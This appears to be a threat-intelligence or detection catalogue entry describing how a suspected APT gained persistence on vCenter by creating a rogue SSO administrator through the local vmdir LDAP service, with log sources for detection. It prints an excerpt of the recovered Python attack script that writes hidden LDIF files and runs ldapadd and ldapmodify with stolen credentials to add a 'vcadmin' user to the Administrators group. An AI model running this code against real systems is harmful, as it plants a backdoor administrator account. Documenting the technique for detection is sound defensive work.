# Create SSO Administrator via vmdir LDAP

## Component
**vCenter**

## MITRE ATT&CK
- **ID:** T1136.001
- **Tactic:** Persistence

## Description
With root access to the vCenter Server Appliance (VCSA) and recovered `vmdir` machine-account credentials, an attacker can authenticate to the locally running VMware Directory Service (VMDir) LDAP service and create an SSO account with administrative privileges. QUIRSO observed a suspected Chinese-nexus APT attempt LDAPS on TCP/636, fall back to LDAP on TCP/389, create an SSO account, and add it to the built-in `Administrators` group.

This could allow pivoting from root-level access on VCSA, to administrative control of the vCenter SSO directory.

The Python script carrying out this action was recovered:  

```python
with open("/tmp/.a.ldif", "w") as f:
    f.write("dn: %s\nuserPrincipalName: %s\nsAMAccountName: vcadmin\ncn: vcadmin\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: user\nuserPassword: %s\n" % (dn, upn, PASS))
p1 = subprocess.Popen(["ldapadd", "-x", "-h", "127.0.0.1", "-D", DCDN, "-w", DCPW, "-f", "/tmp/.a.ldif"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
...
with open("/tmp/.b.ldif", "w") as f:
    f.write("dn: cn=Administrators,cn=Builtin,%s\nchangetype: modify\nadd: member\nmember: %s\n" % (base, dn))
p2 = subprocess.Popen(["ldapmodify", "-x", "-h", "127.0.0.1", "-D", DCDN, "-w", DCPW, "-f", "/tmp/.b.ldif"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
```

Note: While the threat actor was unnamed in the original research and was referred to simply as a "Chinese-Nexus APT", the GitHub username `pikpak0066` is attached below for test case identification purposes, which was the creator of a repository linked to the incident. More details can be found in the QUIRSO investigation linked in the References.

## Threat Actors
- pikpak0066

## Log Sources
- VMDir Logs (/var/log/vmware/vmdird/vmdird-syslog.log)
- STS IDMD Logs (/var/log/vmware/sso/vmware-sts-idmd.log)
- SSO Audit Events (/var/log/vmware/sso/audit_events.log)
- Auth Logs (/var/log/auth.log)

## References
- https://medium.com/@quirso_de/global-exploitation-of-cve-2026-59310-by-suspected-chinese-nexus-apt-related-cve-2026-59309-443a79e1466d
https://github.com/QUIRSO/QTR/blob/main/2026-08/Global%20Exploitation%20of%20CVE-2026-59310%20by%20Suspected%20Chinese-Nexus%20APT%20and%20Related%20CVE-2026-59309%20Activity/scripts/x.py


## Author
Leonidas Tsaousis (@laripping)
